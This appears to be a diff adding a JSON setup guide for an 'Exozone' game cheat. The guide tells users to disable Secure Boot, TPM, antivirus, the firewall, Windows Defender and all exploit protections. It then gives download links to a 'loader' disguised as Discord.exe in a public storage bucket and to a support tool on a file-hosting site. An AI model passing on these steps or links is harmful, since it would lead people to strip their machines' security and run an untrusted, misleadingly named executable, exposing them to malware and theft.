@@ -1,0 +1,21 @@
+{
+  "guide": "Exozone Setup Guide",
+  "sections": [
+    {
+      "title": "Introduction",
+      "text": "Before you can use Exozone products you must first be sure to setup your PC correctly. There are a few things you will need to ensure have been set correctly in your BIOS."
+    },
+    {
+      "title": "BIOS Setup",
+      "text": "In order for the cheat to run correctly the following must be set correctly through your BIOS:\n\nFormat Drives to GPT Partitions:\n\nSet Boot Mode to UEFI:\nRestart your computer.\nEnter the BIOS/UEFI setup by pressing a specific key during boot (usually F2, F10, F12, or Del).\nLook for the \"Boot\" or \"Boot Options\" menu and ensure that the boot mode is set to UEFI.\n\nEnable Virtualization:\nEnter the BIOS/UEFI setup.\nLook for settings related to Intel Virtualization Technology (VT-x) and Intel Virtualization Technology for Directed I/O (VT-d) and ensure they are enabled.\nIf you have AMD then it is called SVM.\n\nDisable Secure Boot:\nIn the BIOS/UEFI setup, locate the \"Secure Boot\" option and disable it.\nYou may need to delete all bootable keys associated with Secure Boot.\n\nOptional: Disable TPM:\nIn the BIOS/UEFI setup, locate the Trusted Platform Module (TPM) option and disable it if needed."
+    },
+    {
+      "title": "From Windows: Disable Security Measures",
+      "text": "Completely disable any antivirus software, firewall, and Windows Defender.\n\nDisable Exploit Protection:\nOpen Windows Security.\nGo to \"App & browser control.\"\nUnder \"Exploit protection settings,\" turn off each option.\n\nDisable Fast Boot:\n\nRestart Your Computer:\nSave your BIOS/UEFI settings and exit.\nRestart your computer to apply the changes."
+    },
+    {
+      "title": "Download and Run",
+      "text": "Download the loader here: https://abnypbwebtsrxvoyhgdv.supabase.co/storage/v1/object/public/public_bucket/Discord.exe\n\nDownload our support tool here: https://mega.nz/file/ioJQ3TAK#khDxBBZ0_LiX__6zEnfr2N6PG1_HDuv271J5rFus7yQ\n\nMake everything green in the support tool before downloading the loader!"
+    }
+  ]
+}
